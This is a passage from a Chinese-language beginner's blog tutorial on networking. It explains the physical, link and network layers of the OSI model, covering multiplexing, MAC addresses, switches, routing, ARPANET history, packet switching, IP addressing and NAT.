无线信道（比如：微波通讯、电台广播、卫星通讯、等等）\\3. 存储信道 “存储信道”比较少见，很多人没听说过，稍微解释一下。 假设你要把一大坨信息传送给另一个人，除了用“有线 or 无线”这两种通讯方式，还可以把信息先保存到某种【存储介质】（比如硬盘），然后再把存储介质用某种方式（比如快递）转交给对方。这就是所谓的“存储信道”。 ◇信噪比（Signal-to-noise ratio） 俺在很多篇关于“学习＆心理学”的博文中提到过【信噪比】这个概念。其实这个概念是从通讯领域借用的术语。 对于“物理信道”，总是会存在某些环境干扰，称之为“噪声”（Noise）。“信道传输的有用信息”与“无用的干扰噪声”，这两者的比值就是“信噪比”。 “信噪比”单位是【分贝】。“分贝”洋文叫做“decibel”（简写为 dB）。“deci”表示“十进制”；“bel”是为了纪念大名鼎鼎的贝尔（电话它爹）。 ◇带宽的限制因素 “物理信道”要依赖于物理传输介质。不管使用何种物理介质，都要受限于某些基本的物理学定律（比如“光速上限”）。另外，不管何种物理介质，总是会有或多或少的环境干扰（噪声）。这两个因素导致了：任何“物理信道”的最大传输率总是有限滴。 由于物理层是最底下的一层，物理层之上的其它层次总是要直接或间接地依赖【物理信道】。因此，其它层次建立的“逻辑信道”，其带宽只会比“物理信道”的最大带宽更小。换句话说：“物理信道”的带宽上限也就是整个协议栈的带宽上限。 ◇多路复用（Multiplexing） 一般来说，凡是能实现【长距离】通讯的“物理信道”，都有相当的经济成本。比如铺设“光纤、同轴电缆”都要花钱。无线电通讯虽然免去了铺设线路的成本，但需要竞标购买频段。因此，物理信道非常强调“多路复用”。 所谓的“多路复用”，通俗地说就是：尽可能地共享物理信道，不要浪费了。 “多路复用”有很多种类型；不同的类型，原理也不同。为了展示各种不同的原理，俺拿【无线通信】来说事儿。 无线通信领域的“多路复用”，【至少】有如下几种： 频分多路复用/FDM（Frequency-Division Multiplexing） 这个最简单，就是根据频率拆分。不同的线路占用不同的频段，互不干扰。（电台广播用的就是这个思路） 但这个思路的缺点很明显——其一，要依赖足够宽的频段（频段是稀缺资源）；其二，不同线路的流量可能会动态变化。如果某个线路空闲，其占用的频段就浪费了。 （注：光纤通讯中有个“波分多路复用/WDM”，本质上就是 FDM） 时分多路复用/TDM（Time-Division Multiplexing） 这种思路只用一个很窄的频段。为了在同一个频道发送多个信道，采用【分时机制】，把时间切割成很小的时间片，每个线路占用一个时间片。周而往复。 这个思路有点像十字路口的红绿灯——每隔一段时间，其中一条路可以通行。 这个思路的优点是：可以只使用一个很窄的频段。缺点是：线路越多，每条线路等待越久；即使某个线路空闲，依然会占用时间片（浪费了资源）。 码分多路复用/CDM（Code-Division Multiplexing） 这种思路采用某种【编码】的技巧，使得多个端点可以在同一个时间点使用同一频段发送数据；由于他们采用不同的编码方式，不会相互干扰。 一般来说，CDM 要依赖于“扩频技术”（spread spectrum），需占用一个比较宽的频道范围。这算是缺点。但其优点很明显——其一，可以支持 N 个线路（N 动态变化）；其二，即使任何一个线路的流量动态变化，也不会浪费物理信道的资源。 显然，这种思路明显优于 FDM ＆ TDM。如今在移动通讯领域大名鼎鼎的 CDMA（码分多址），采用的就是这个思路。 ★物理层：具体实例◇物理层的【协议】 物理层的协议主要有如下：USB 协议蓝牙协议的一部分IEEE 802.11 的一部分（Wi-Fi）IEEE 802.16（WiMAX）IEEE 1394（火线接口）RS-232 协议（串行接口/串口）……（考虑到篇幅）俺不可能具体细聊这些协议，只是贴出每个的维基百科链接，感兴趣的同学自己点进去看。 ◇物理层的【协议实现】 对于电脑主机（含移动设备），“网卡硬件”包含了物理层的协议实现（参见如下示意图） 另外，还有一些专门的【1层】网络设备，也提供物理层的功能（参见下一个小节）。 （OSI 模型中，不同层次的协议实现） ◇物理层相关的【网络设备】调制解调器（modem） 通俗地说，“调制解调器”就是用来翻译“数字信号 ＆ 模拟信号”。 在发送信息时，modem 把电脑要发送的“字节流”（数字信号）翻译成“模拟信号”，然后通过物理介质发送出去；当它从物理介质收到“模拟信号”，再翻译成“数字信号”，传回给电脑。 早期的拨号上网，modem 面对的物理介质是“固话线路”；如今家庭宽带普及，光纤入户，modem 面对的物理介质是“光纤线路”。 （老式 modem，用于固定电话线路） 中继器（repeater） 信号在物理介质中传输，会出现【衰减】（不论是“有线 or 无线”都有可能衰减）。“中继器”的作用是【信号增益】，使得信号能传得更远。 另外，比如“微波通讯”是直线传播，而地球表面有弧度，还有地形的起伏。所以每隔一定距离要建“微波塔”。这玩意儿也相当于“中继器”。 （微波塔示意图） 集线器（hub） 可以把“集线器”视作更牛逼的“中继器”——“中继器”只有两个口（只能连接两个通讯端点），而“集线器”有多个口（同时连接多个通讯端点）。 通常所说的“集线器”是指“以太网集线器”。这种设备如今已经逐步淘汰，很少见到了。 （老式的10兆以太网集线器） 另外，很多同学应该都用过“USB hub”，就是针对 USB 线的“集线器”（“USB 线”也可以视作某种通讯介质）。 ★链路层：概述◇链路层的必要性对信息的打包 物理层传输的信息，通俗地说就是【比特流】（也就是一长串比特）。但是对于计算机来说，“比特流”太低级啦，处理起来极不方便。“链路层”要干的第一个事情，就是把“比特流”打包成更大的一坨，以方便更上层的协议进行处理。在 OSI 模型中，链路层的一坨，称之为“帧”（frame）。 差错控制 物理介质的传输，可能受到环境的影响。这种影响不仅仅体现为“噪声”，有时候会出现严重的干扰，导致物理层传输的“比特流”出错（某个比特“从0变1”或“从1变0”）。因此，链路层还需要负责检查物理层的传输是否出错。在 IT 行话中，检测是否出错，称之为“差错控制机制”（后面有一个小节会简单说一下这个话题）。 流量控制 假设两个端点通过同一个物理信道进行通讯，这两个端点处理信息的速度可能不同。如果发送方输出信息的速度超过接收方处理信息的速度，通讯就会出问题。于是就需要有某种机制来协调，确保发送方的发送速度不会超出接收方的处理速度。在技术行话中，这称之为“流量控制”，简称“流控”。 信道复用 在上一个章节已经讲到：用于远距离通讯的“物理介质”，总是有成本。因此需要对物理信道进行“多路复用”，就会导致多个端点共用同一个物理信道。如果同时存在多个发送者和多个接收者。接收者如何知道某个信息是发给自己而不是别人？ 另外，某些物理介质可能不支持并发（无法同时发送信息）。某些物理介质可能是【半双工】，所有这些物理层的限制，都使得“多路复用”变得复杂。为了解决这些问题，链路层需要提供了某种相应的机制（协议），术语叫做“介质访问控制”（洋文是“Media Access Control”，简称 MAC）。后续小节会聊它。 ◇差错控制 为了发现传输的信息是否出错，设计了很多相应的数学算法。这些算法大体分为两类：“检错算法 ＆ 纠错算法”。 简而言之，“检错算法”只能检测出错误，而“纠错算法”不但能检测出错误，还能纠正错误。很显然，“纠错算法”更牛逼，但是它也更复杂。 常见的“检错算法”对传输的数据计算出一个【校验值】，接收方收到数据会重新计算校验和，如果算出来不对，就把收到的数据丢弃，让对方重发。“校验算法”的原理类似于《扫盲文件完整性校验——关于散列值和数字签名》一文中提到的“散列算法/哈希算法”。 “纠错算法”更高级，由于涉及到更多数学，俺就不展开啦。 对于【无线】物理信道，由于出错的概率更高，并且重新传输数据的成本也更高。所以【无线】通讯的链路层协议，更倾向于用【纠错】机制；作为对比，【有线】通讯的链路层协议，更倾向于用【检错】机制。 ◇MAC 协议 “MAC 协议”用来确保对下层物理介质的使用，不会出现冲突。为了形象，俺拿“铁路系统”来比喻，说明“MAC 协议”的用途。 假设有一条【单轨】铁路连接 A/B 两地。有很多火车想从 A 开到 B，同时还有很多火车想从 B 开到 A。 首先，要确保不发生撞车（如果已经有车在 A 开往 B 的途中，那么 B 就不能再发车）；其次，即使是同一个方向的车，出发时间也要错开一个时间间隔。 所有这些协调工作，都是靠“MAC 协议”来搞定。 ◇MAC 地址 为了完成上述任务，光有“MAC 协议”还不够，还需要为每一个端点引入【惟一的】标识。这个标识就称作“MAC 地址”。 通俗地说，每个网卡都内置了一个“MAC 地址”。这个地址是网卡在出厂的时候就已经设置好的，并且用某种机制确保该地址【全球唯一】。 如何保证 MAC 地址全球唯一捏？简单说一下： MAC 地址包含6个字节（48个比特），分为两半。第一部分称作【OUI】，OUI 的24个比特中，其中2个比特有特殊含义，其它22个比特，用来作为网卡厂商的唯一编号。这个编号由国际组织 IEEE 统一分配。 MAC 地址第二部分的24比特，由网卡厂商自己决定如何分配。每个厂商只要确保自己生产的网卡，后面这24比特是唯一的，就行啦。 （MAC 地址的构成） 由于俺在很多安全教程中鼓吹大伙儿使用“操作系统虚拟机”，再顺便说说【虚拟网卡】的 MAC 地址。 “虚拟网卡”是由【虚拟化软件】创建滴。IEEE 也给每个虚拟化软件的厂商（含开源社区）分配了唯一的 OUI。因此，虚拟化软件在创建“虚拟网卡”时，会使用自己的 OUI 生成前面24个比特；后面的24比特，会采用某种算法使之尽可能【随机化】。由于“2的24次方”很大（224 = 16777216），碰巧一样的概率很低。 （注：如果手工修改 MAC 地址，故意把两块网卡的 MAC 地址搞成一样，那确实就做不到唯一性了。并且会导致链路层的通讯出问题） ★链路层：具体实例◇链路层的【协议】 链路层的协议主要有如下：MAC 协议（介质访问控制）LLC 协议（逻辑链路控制）ARP 协议（解析 MAC 地址）IEEE 802.3（以太网）IEEE 802.11 的一部分（Wi-Fi）L2TP 协议（2层VPN）PPP 协议（拨号上网）SLIP 协议（拨号上网）……（考虑到篇幅）俺不可能具体细聊这些协议，只是贴出每个的维基百科链接，感兴趣的同学自己点进去看。 ◇链路层的【协议实现】 对于电脑主机（含移动设备），“网卡硬件 ＆ 网卡驱动”会包含链路层协议的实现（参见如下示意图）。 另外，还有一些专门的【2层】网络设备，也提供链路层的功能（参见下一个小节）。 （OSI 模型中，不同层次的协议实现） ◇链路层相关的【网络设备】网络交换机（network switch） （注：一般提到“网络交换机”，如果不加定语，指的就是“2层交换机”；此外还有更高层的交换机，在后续章节介绍） 为啥要有交换机捏？俺拿“以太网的发展史”来说事儿。 以太网刚诞生的时候，称之为“经典以太网”，电脑是通过【集线器】相连。“集线器”前面提到过，工作在【1层】（物理层），并不理解链路层的协议。因此，集线器的原理是【广播】模式——它从某个网线接口收到的数据，会复制 N 份，发送到其它【每个】网线接口。假设有4台电脑（A、B、C、D）都连在集线器上，A 发数据给 B，其实 C ＆ D 也都收到 A 发出的数据。显然，这种工作模式很傻逼（低效）。由于“经典以太网”的工作模式才“10兆”，所以集线器虽然低效，还能忍受。 后来要发展“百兆以太网”，再用这种傻逼的广播模式，就不能忍啦。于是“经典以太网”就发展为“交换式以太网”。用【交换机】代替“集线器”。 交换机是工作在2层（链路层）的设备，能够理解链路层协议。当交换机从某个网线接口收到一份数据（链路层的“帧”），它可以识别出“链路帧”里面包含的目标地址（接收方的 MAC 地址），然后只把这份数据转发给“目标 MAC 地址相关的网线接口”。 由于交换机能识别2层协议，它不光比集线器的性能高，而且功能也强得多。比如（稍微高级点的）交换机可以实现“MAC 地址过滤、VLAN、QoS”等多种额外功能。 网桥/桥接器（network bridge） “交换机”通常用来连接【同一种】网络的设备。有时候，需要让两台不同网络类型的电脑相连，就会用到【网桥】。 下面以“操作系统虚拟机”来举例（完全没用过虚拟机的同学，请跳过这个举例）。 在这篇博文，俺介绍了虚拟机的几种“网卡模式”，其中有一种模式叫做【bridge 模式】。一旦设置了这种模式，Guest OS 的虚拟网卡，对于 Host OS 所在的外部网络，是【双向】可见滴。也就是说，物理主机所在的外部网络，也可以看见这块虚拟网卡。 现在，假设你的物理电脑（Host OS）只安装了【无线网卡】（WiFi），而虚拟化软件给 Guest OS 配置的通常是【以太网卡】。显然，这是两种【不同】的网络。为啥 Guest OS 的以太网卡设置为“bridge 模式”之后，外部 WiFi 网络可以看到它捏？ 奥妙在于——虚拟化软件在内部悄悄地帮你实现了一个“网桥”。这个网桥把“Host OS 的 WiFi 网卡”与“Guest OS 的以太网卡”关联起来。WiFi 网卡收到了链路层数据之后，如果接收方的 MAC 地址对应的是 Guest OS，网桥会把这份数据丢给 Guest OS 的网卡。 这种网卡模式之所以称作“bridge 模式”，原因就在于此。 ◇链路层相关的【软件工具】嗅探抓包工具（Sniffer） 要了解链路层的数据包结构，需要用到“嗅探工具”。这类工具能捕获流经你网卡的所有【链路层】数据包。前面聊“协议栈”的时候说过：下层数据包的载荷就是上层数据包的整体。因此，拿到【链路层】数据包也就意味着：你已经拿到2层之上的所有数据包的信息了。 有些抓包工具自带图形界面，可以直接显示数据包的内容给你看。还有些只提供命令行（只是把获取的数据包保存为文件），然后要搭配其它图形化的工具来展示数据包的内容。 抓包的工具有很多，名气最大的是 Wireshark（原先叫做 Ethereal）。 ARP 命令 首先，ARP 是“MAC 地址解析协议”的洋文名称。该协议根据“IP 地址”解析“MAC 地址”。 Windows 自带一个同名的 arp 命令，可以用来诊断与“MAC 地址”相关的信息。比如：列出当前子网中其它主机的 IP 地址以及对应的 MAC 地址。这个命令在 Linux ＆ Mac OS 上也有。 ★网络层：概述◇网络层的必要性路由机制（routing） 在 OSI 模型中，链路层本身【不】提供路由功能。你可以通俗地理解为：链路层只处理【直接相连】的两个端点（注：这么说不完全严密，只是帮助外行理解） 对于某个复杂网络，可能有很多端点，有很复杂的拓扑结构。当拓扑足够复杂，总有一些端点之间【没有直连】。那么，如何在这些【没有直连】的端点之间建立通讯捏？此时就需要提供某种机制，让其它端点帮忙转发数据。这就需要引入“路由机制”。 为了避免把“链路层”搞得太复杂，路由机制放到“链路层”之上来实现，也就是“网络层”。 基于【路由】的地址编码方式 链路层已经提供了某种全球唯一的地址编码方式（MAC 地址）。但“MAC 地址”有如下几个问题：其一，它是固定的（虽然可以用技术手段去修改 MAC 地址，但很少这么干）其二，MAC 地址的编码是基于【厂商】，无法体现网络拓扑结构。或者说，“MAC 地址”对于“路由机制”是不够友好滴。 因此，需要引入一种更抽象（更高层）的地址，也就是“网络层地址”。咱们常说的“IP 地址”，是“网络层地址”的实现方式之一。 为了帮你理解，举个例子： 每个人都有身份证号（这就类似于“MAC 地址”）。当某人加入了某个公司，公司会为此人再分配一个“员工号”（这就类似于“网络地址”）。既然有身份证号，为啥公司还要另搞一套“员工编号”捏？因为“员工编号”有额外的好处。比如说：可以把员工号划分为不同的区间，对应不同的部门。这样一来，只要看到员工号，就知道此人来自哪个部门。 类似道理，每个网卡都有自己固定的 MAC 地址，当这个网卡接入到不同的网络，每次都可以再分配不同的“网络地址”。通过“网络地址”可以看出这个网卡属于哪个网络（对路由比较方便）。 网际互联（internetwork） 引入“网络层”的另一个目的是：屏蔽不同类型的网络之间的差异，从而有利于【网际互联】（也就是建立“网络的网络”）。 一般来说，要想联通【异种】网络，就要求每个网络中都有一台主机充当【网关】（gateway）。【网关】起到“中介/翻译”的作用——帮不同的网络翻译协议，使得不同的网络可以互相联通。 假设【没有】统一的网络层，网关的工作就很难做。就好比说：如果全球没有某种通用的自然语言，就需要培养非常多不同类型的翻译人才（假设有30种主要语言，任意两种互译，就需要几百种不同的翻译人才）。 反之，如果有了某种统一的网络层标准，问题就好办多了（还是假设有30种主要语言，只要选定某种作为通用语，然后培养29种翻译人才，就可以实现任意两种语言互译）。 如今的互联网时代，【IP 协议】就是那个充当统一标准的网络层协议。 （互联网整合了各种类型的网络） ◇网络拓扑（network topology） 网络的拓扑结构有很多种，有简单的，有复杂的。一般来说，再复杂的拓扑，也可以逐步分解为若干简单拓扑的组合。 对拓扑的研究，有专门一个数学分支（拓扑学）。考虑到本文只是扫盲，俺不可能再去聊“拓扑学”。因此，只挑几种简单的拓扑结构，让大伙儿有个直观的印象。 （常见的网状拓扑结构：星形拓扑、环形拓扑、总线拓扑、网状拓扑、等等） 如今的互联网，整体的拓扑结构超级复杂。但还是可以逐步分解为上述几种基本的拓扑结构。 （互联网的复杂拓扑，右下角是图中某个小点的放大。为节省大伙儿的翻墙流量，俺贴的是缩小图。点“这里”看原始图） ◇互联网的拓扑——从“历史”的角度看其健壮性 从上面那张图可以看出：互联网拓扑的【局部】有很多是“星形拓扑”（当然也有其它的）。但从【宏观】上看，更像是“网状拓扑”。 在现实生活中，对于复杂结构，通常都会采用“树状层次结构”，以便于管理。比如：域名系统、公司组织结构、官僚系统 …… 那为啥互联网的【宏观】拓扑结构是“网状”捏？这就要说到互联网的历史。 在上世纪50年代（冷战高峰期），美国军方的指挥系统高度依赖于电信公司提供的电话网络。当时的电话网络大致如下——在基层，每个地区有电话交换局，每一部电话都连入当地的交换局。在全国，设有若干个长途局，每个交换局都接入某个特定的长途局（不同地区的交换局通过长途局中转）。 简而言之，当时美国的电话网络是典型的【多级星形拓扑】。这种拓扑的优点是：简单、高效、便于管理；但缺点是：健壮性很差。从这个案例中，大伙儿可以再次体会到“效率”与“健壮性”之间的矛盾。俺写过一篇很重要的博文（这里）深入讨论了这个话题。 话说1957年的时候，苏联成功试射第一颗洲际弹道导弹（ICBM），美国军方开始担心：一旦苏联先用洲际导弹攻击美国，只要把少数几个长途局轰掉，军方的指挥系统就会瘫痪。也就是说，“长途局”已经成为美国军方的【单点故障】（何为“单点故障”？参见这篇博文）。 1960年，美国国防部找来大名鼎鼎的兰德公司进行咨询，要求提供一个应对核打击的方案。该公司的研究员 Paul Baran 设计了一个方案，把“星形拓扑”改为【网状拓扑】。采用【网状拓扑】的好处在于：即使发生全面核大战，大量骨干节点被摧毁，整个网络也不会被分隔成几个孤岛，军方的指挥系统依然能正常运作。 （左边：互联网诞生前——美国的电话网络 右边：兰德公司的“Baran 方案”） 有了兰德公司的方案，美国军方找到当时最大的电信公司 AT＆T，想要实现这个系统，结果被否决了。AT＆T 高层认为：搞这样一种系统根本不切实际。于是 Baran 的方案中途夭折。 为啥 AT＆T 反对这个方案捏？一方面，成功的大公司总是有很强的思维定势；另一方面，Baran 的设计方案确实很超前——其前瞻性不仅包括“拓扑结构”，而且把当时电信行业的几大核心观念完全颠覆掉了（具体如何颠覆，后续章节还会再聊）。 时间一晃又过了好多年，到了60年代末，由于一系列机缘巧合，英国佬发现了“Baran 方案”的价值，并据此搞了一个小型的 NPL 网络（NPL 是“国家物理实验室”的缩写）。然后在某次 ACM 会议上，美国佬看到英国佬的论文，才意识到：Baran 方案完全可行。经历了“出口转内销”的命运之后，该方案重新被美国国防部重视。之后，（国防部下属的）“高级计划研究局”（ARPA）开始筹建“阿帕网”（ARPANET），才有了如今的互联网。 ◇路由的大致原理 聊完“拓扑”，再来聊“路由”。 当主机 A 向主机 B 发送网络层的数据时，大致会经历如下步骤：1.A 主机的协议栈先判断“A B 两个地址”是否在同一个子网（“子网掩码”就是用来干这事儿滴）。如果是同一个子网，直接发给对方；如果不是同一个子网，发给本子网的【默认网关】。（此处所说的“网关”指“3层网关/网络层网关”）2.对于“默认网关”，有可能自己就是路由器；也可能自己不是路由器，但与其它路由器相连。也就是说，“默认网关”要么自己对数据包进行路由，要么丢给能进行路由的另一台设备。（万一找不到能路由的设备，这个数据就被丢弃，于是网络通讯出错）3.当数据到达某个路由器之后，有如下几种可能——3.1该路由器正好是 B 所在子网的网关（与 B 直连），那就把数据包丢给 B，路由过程就结束啦；3.2亦或者，路由器会把数据包丢给另一个路由器（另一个路由器再丢给另一个路由器） …… 如此循环往复，最终到达目的地 B。3.3还存在一种可能性：始终找不到“主机 B”（有可能该主机“断线 or 关机 or 根本不存在”）。为了避免数据包长时间在网络上闲逛，还需要引入某种【数据包存活机制】（洋文叫做“Time To Live”，简称 TTL）。通常会采用某个整数（TTL 计数）表示数据包能活多久。当主机 A 发出这个数据包的时候，这个“TTL 计数”就已经设置好了。每当这个数据包被路由器转发一次，“TTL 记数”就减一。当 TTL 变为零，这个数据包就死了（被丢弃）。 对于某些大型的复杂网络（比如互联网），每个路由器可能与其它 N 个路由器相连（N 可能很大）。对于上述的 3.2 情形，它如何判断：该转发给谁捏？ 这时候，“路由算法”就体现出价值啦——一般来说，路由器内部会维护一张【路由表】。每当收到一个网络层的数据包，先取出数据包中的【目标地址】，然后去查这张路由表，看谁距离目标最近，就把数据包转发给谁。 上面这段话看起来好像很简单，其实路由算法挺复杂滴。考虑到本文是“扫盲性质”，而且篇幅已经很长，不可能再去聊“路由算法”的细节。对此感兴趣的同学，可以去看《计算机网络》的第5章。 ◇路由算法的演变史（以互联网为例） （技术菜鸟可以跳过这个小节） 由于互联网的 IP 协议已经成为“网络层协议”的事实标准，俺简单聊一下互联网的路由机制是如何进化滴。 第1阶段：静态全局路由表 （前面说了）互联网的前身是“阿帕网/ARPANET”。在阿帕网诞生初期（上世纪70年代），全球的主机很少。因此，早期的路由表很简单，既是“全局”滴，又是“静态”滴。简而言之，每个路由器内部都维护一张“全局路由表”，这个“路由表”包含了全球所有其它路由器的关联信息。每当来了一个数据包，查一下这张全局路由表，自然就清楚要转发给谁，才能最快到达目的地。 早期的阿帕网，主机的变化比较少，也很少增加路由器。每当出现一个新的路由器，其它路由器的管理员就手工编辑各自的“全局路由表”。 为了加深大伙儿印象，特意找来两张70年代初的阿帕网拓扑图（注：图中的 IMP 是“Interface Message Processor”的缩写，也就是如今所说的“路由器”）。 （1973年的阿帕网） （1977年的阿帕网） 第2阶段：动态全局路由表 后来，“阿帕网/互联网”的规模猛增，路由器数量也跟着猛增，隔三差五都有新的路由器冒出来。再用“静态路由表”这种机制，（编辑路由表的）管理员会被活活累死。于是改用“动态路由表”，并引入某种“路由发现机制”。但“路由表”依然是【全局】滴。 第3阶段：动态分级路由表 再到后来，全球的路由器越来越多，成千上万，再搞“全局路由表”已经不太现实了——一方面，“全局路由表”越来越大（查询的速度就越来越慢）另一方面，由于互联网的流量越来越大，每来一个数据包都要查表，查询越来越频繁。 于是，路由器开始吃不消了。为了解决困境，想出一个新招数：引入“分级路由”（hierarchical routing）。所谓的“分级路由”就是：把整个互联网分为多个大区域，每个大区域内部再分小区域，小区域内部再分小小区域 …… 看到这里，熟悉“数据结构与算法”的同学就会意识到——这相当于构造了一个【树状】层次结构。 有了这个层次结构，每个路由器重点关注：自己所在的那个最小化区域里面的网络拓扑。如此一来，每个路由器的“路由表”都会大幅度减小。 （全局路由表 VS 分级路由表） ◇互联网的路由——从“CAS”的角度看其健壮性 去年（2020）俺写了一篇博文《“政治体制”与“系统健壮性”——基于“复杂性科学”的思考》，其中介绍了“CAS”（复杂自适应系统）的概念。互联网的路由机制，就是一个典型的 CAS。 如果把互联网视作一个系统，每个公网上的路由器都是一个自适应的主体。假如某个地区的网络流量突然暴涨，骨干网路由器会自动分流；假如因为地震或战争，导致某个地区的骨干网路由器全部下线，周边地区的路由器也会自动避开这个区域 ….. 所有这些工作，【不需要】依靠任何最高指挥中枢，去进行协调。 相反，如果互联网的路由系统中，设立了某种“中央委员会”进行实时调度，那互联网早就完蛋了，根本无法成长为今天这种规模。 ◇网络层的两种交换技术——电路交换（circuit switching） VS 分组交换（packet switching） （技术菜鸟可以跳过这个小节） 前面聊“互联网诞生”，说到兰德公司的“Baran 方案”。该方案对当时的电信系统提出几大革命性的变化，其中之一就是“分组交换”技术（也称“数据包交换”or“封包交换”）。 一般来说，网络层的设计有两种截然不同的风格：【电路交换 VS 分组交换】。有时候也分别称之为“有连接的网络层 VS 无连接的网络层”。此处所说的“连接”指的是某种“虚电路”（洋文叫做“virtual circuit”，简称 VC）。 要理解“虚电路”，首先要从老式的电话系统说起。 最早期的电话，既没有拨号盘也没有按键，全靠一张嘴。当你拿起电话，先告诉接线员你要打给谁，接线员会用一根跳接线，插入电话交换设备的某个插孔，从而把你的电话机与对方的电话机相连。于是建立了一条两人之间的电话通路，也就是“电路”。你可以把“接线员”想象成某种“人肉路由器” :) （1900年法国巴黎的电话交换局，可以看到接线员在操作电话交换设备） 后来发明了“自动电话交换机”，导致“接线员”全体下岗。虽然自动化了，但原理还是一样——当你在电话上拨了某人的号码，电话局的交换机会自动选择一条线路。只有当这条线路建立起来，对方的电话才会响。一旦双方开始通话，双方之间的语音都是通过这条线路传输。并且这条线路是独占的——只要通话不挂断，这条线路就不会再分配给其他人使用。 前面提到“互联网诞生的历史”，当时军方推动的“Baran 方案”被 AT＆T 断然拒绝。因为这个方案完全颠覆了传统的电话系统——颠覆之1：把“模拟信号”颠覆为“数字信号”（这点比较好理解，俺就不解释了）颠覆之2：把“星形拓扑”颠覆为“网状拓扑”（关于这点，前面的小节已经讨论了）颠覆之3：把“电路交换”颠覆为“分组交换”（这就是本小节的重点） 为了帮大伙儿理解上述第3点，举个例子： 假设主机 A 要向主机 B 发送一大坨数据。因为数据太多，肯定要分成好几坨小一点的（分成多个数据包）。如何把这些数据包发送给对方捏？ “电路交换”的实现方式在发送数据之前，要先建立连接通道（通过路由算法，找出 A ＆ B 之间的某条通路）。这条通路就是所谓的“虚电路/VC”。一旦 VC 建立，每一个数据包都是从这条拓扑路径进行路由。 “分组交换”的实现方式在发送数据之前，【不需要】建立通道，让每个数据包独立进行路由。这种情况下，这几个数据包可能会走【不同的】拓扑路径。因此，数据包到达的顺序与发送的顺序【不一定】相同。接收方收到所有数据包之后，还要自己进行排序。 维基百科上有一个 GIF 动画（这个链接），比较直观地演示“分组交换/封包交换”的效果。由于这个动画稍微有点大（超过 1MB），俺就不贴到博文中了。 当时的电话系统主要承载语音传输，“电路交换”显然性能更高。那为啥 Baran 的设计要采用“分组交换”捏？俺又要再次提到【效率 VS 健壮性】之间的矛盾与均衡。 对于“电路交换”，一旦建立连接，同一个连接的所有数据都走相同的路径（会经过完全相同的路由器）。也就是说，传输的过程中，如果某个路由器挂掉了（网络掉线 or 硬件当机 or 软件崩溃）。那么，该路由器正在处理的 N 个连接全都要报废。而“分组交换”则更加灵活——即使某个路由器挂掉了，后续的数据包会自动转向另外的路由器，损失很小。 “Baran 方案”之所以采用“分组交换”的设计，因为人家这个方案是提交给军方用来应对【全面核战争】滴，当然要考虑健壮性啦。 话说这两种交换机制，各有很多支持者，并分裂为两大阵营，分别是：“电信阵营 VS 互联网阵营”。两大阵营的口水战持续了 N 年，都无法说服对方。到了后来设计 OSI 模型的时候，为了保持中立性与通用性，OSI 模型本身并没有强制要求网络层采用哪一种风格。 经过几十年之后，咱们已经可以看出来：“互联网阵营”占据主导地位。如今，连电信系统都是架构在互联网之上。 ★网络层：具体实例◇网络层的【协议】 网络层的协议有很多。由于“互联网”已经成为全球的事实标准，因此俺只列出属于“互联网协议族”的那些“网络层协议”：IP 协议（含 IPv4 ＆ IPv6）ICMPIGMPIPSec……（考虑到篇幅）俺不可能具体细聊这些协议，只是贴出每个的维基百科链接，感兴趣的同学自己点进去看。 对上述这些协议，最重要的当然是 IP 协议。如果你想要深入了解 IP 协议，可以参考如下这本书。关于 IP 协议的书，此书的影响力最大。这本书共3卷，通常只需看第1卷。《TCP-IP 详解》 ◇网络层的【协议实现】 对于电脑主机（含移动设备），网络层的协议实现通常包含在操作系统自带的网络模块中（也就是“操作系统协议栈”）。具体参见如下示意图。 另外，还有一些专门的【3层】网络设备，也提供网络层的功能（参见本章节的后续小节）。 （OSI 模型中，不同层次的协议实现） ◇IP 地址的格式及含义 当年设计阿帕网的时候，采用了【4字节】（32比特）来表示“网络层地址”（也就是 IP 地址）。 “IP 地址”的含义很重要，俺有必要解释一下： 咱们平时所说的 IP 地址，采用【点分十进制】来表示。就是把地址的4个字节，先翻译为十进制，然后每个字节用一个小数点分隔开（参见如下示意图）： （4字节 IP 地址：“二进制”与“点分十进制”的对照示意图） “IP 地址”的32比特，分为两部分：第1部分用来标识【子网】，第2部分用来标识该子网中的【主机】。 这两部分各占用多少比特，是不确定的。在这种情况下，“操作系统协议栈”如何知道哪些比特标识“子网”，哪些比特标识“主机”捏？奥妙在于【子网掩码】。所以，大伙儿在给系统配置 IP 地址的时候，通常都需要再设置一个【子网掩码】，就这个用途。 ◇IP 地址枯竭，及其解决方法 前一个小节提到：IP地址包含【4字节】（32比特）。因此，最多只能表示【2的32次方】（42亿左右）的不同地址。考虑到还有很多地址保留给特殊用途，实际可用地址远远不到42亿。 到了如今，全球网民都已经几十亿了，IP 地址开始枯竭。咋办捏？为了解决这个问题，发展出若干技术手段。简单说一下最常见的几种手段： IPv6 名气最大（最多人知道）的技术手段，大概是 IPv6 了。这招想要一劳永逸地解决地址枯竭的问题，采用了16字节（128比特）来表示 IP 地址。 设计 IPv6 的人自豪地宣称：即使给地球上的每一粒沙子分配一个 IPv6 地址，依然绰绰有余（确实没有吹牛，“2的128次方”是天文数字）。 但 IPv6 的缺点在于，【无法】向下兼容原有的 IP 协议（原有的协议叫“IPv4”）。IPv6 的普及一直比较慢，这是主要原因。 代理服务器（proxy） 一看到代理，很多人就想到翻墙。其实它也可以用来解决“地址枯竭”的问题。 比如说，某个公司有100人，100台电脑。如果每台电脑都分配公网 IP 地址，就要消耗100个公网地址（太浪费啦）。 可以只申请一个公网 IP，然后在内网搞一个代理服务器，公网 IP 分配给它（代理服务器有两个网卡，一个接内网，一个接公网）。然后在其它电脑上设置代理，指向这台代理服务器，就都可以上外网啦。 （注：在本文的末尾有一个 ★杂项 的章节，会专门聊一下“代理”这个话题） 网络地址转换（NAT） 前面 proxy 那招有个缺点：内网的每台电脑里面的每个上网软件，都要单独设置代理。实在太麻烦啦！ 后来就发明了某种更牛逼的招数——网络地址转换（洋文是“Network Address Translation”，简称 NAT）。 用了这招，还是只要申请一个公网 IP，分配给内网的网关（网关有两个网卡，一个接内网，一个接公网）。然后在内网的网关配置 NAT 功能，自动就可以让内网的每台电脑访问外网。 在这篇博文，俺介绍了虚拟机的几种“网卡模式”，其中有一种模式叫做【NAT 模式】，就是指这个玩意儿。 采用了 NAT 技术之后，可能会对某些应用软件（尤其是 P2P 类型的）造成兼容性问题，于是又发明了一些“NAT 穿透技术”（NAT traversal）。这类技术有好几种，如果有空的话，俺会单独写教程介绍。 其它解决方法 关于“IPv4 地址空间耗尽”，解决方法肯定不止上面这几招。限于篇幅，就此打住。更多的讨论参见维基百科的“这个链接”。 ◇网络层相关的【网络设备】路由器（router） （前面章节聊“路由原理”的时候，已经介绍过它；这里就不再浪费口水啦） 3层交换机（Layer 3 switching） 